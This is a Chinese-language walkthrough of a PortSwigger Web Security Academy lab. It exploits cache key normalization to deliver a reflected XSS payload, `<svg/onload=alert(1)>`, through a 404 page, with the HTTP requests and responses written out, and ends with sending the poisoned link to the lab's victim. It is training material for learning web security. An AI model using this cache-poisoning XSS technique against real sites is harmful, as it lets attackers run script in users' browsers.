# 实验室：URL 规范化

本实验室包含一个 XSS 漏洞，但由于浏览器的 URL 编码，无法直接利用。

要解决本实验室，请利用缓存的规范化过程来利用此漏洞。找到 XSS 漏洞并注入一个负载，使其在受害者浏览器中执行 `alert(1)`。然后将恶意 URL 发送给受害者。

[访问实验室](https://portswigger.net/academy/labs/launch/da7b121cfc61090ed5e7cecb6c6f31b595087c04ea02056591225cf659e72eec)

## 步骤

探测
- 访问不存在页面
    ```http
    GET /x HTTP/2
    Host: 0a31006d03292cf5801117c80047002f.web-security-academy.net
    ```

    - 响应
        ```http
        HTTP/2 404 Not Found
        Content-Type: text/html; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=10
        Age: 0
        X-Cache: miss
        Content-Length: 20

        <p>
        Not Found: /x
        </p>
        ```
    

测试不存在页面的错误响应 XSS 反射
- 请求
    ```http
    GET /x<svg/onload=alert(1)> HTTP/2
    Host: 0a31006d03292cf5801117c80047002f.web-security-academy.net
    ```
    - 响应
        ```http
        HTTP/2 404 Not Found
        Content-Type: text/html; charset=utf-8
        X-Frame-Options: SAMEORIGIN
        Cache-Control: max-age=10
        Age: 0
        X-Cache: miss
        Content-Length: 41

        <p>
        Not Found: /x<svg/onload=alert(1)>
        </p>
        ```
- 在浏览器打开响应，成功反射
- 在浏览器访问载荷 URL，失败
    - 历史记录中看到载荷被 URL 编码发送

        ```http
        GET /x%3Csvg/onload=alert(1)%3E HTTP/2
        Host: 0a31006d03292cf5801117c80047002f.web-security-academy.net
        ```

        ```http
        <p>
        Not Found: /x%3Csvg/onload=alert(1)%3E
        </p>
        ```

    - 服务器未进行 URL 解码，载荷失败

尝试规范化缓存投毒
- 先后发送两种请求
    ```http
    GET /x%3Csvg/onload=alert(1)%3E HTTP/2
    Host: 0a31006d03292cf5801117c80047002f.web-security-academy.net
    ```
    ```html
    <p>
    Not Found: /x<svg/onload=alert(1)>
    </p>
    ```
    - 发现两种请求可相互使用对方的缓存，缓存被规范化
    
- 将有效载荷请求设置到攻击器，发送链接到受害者
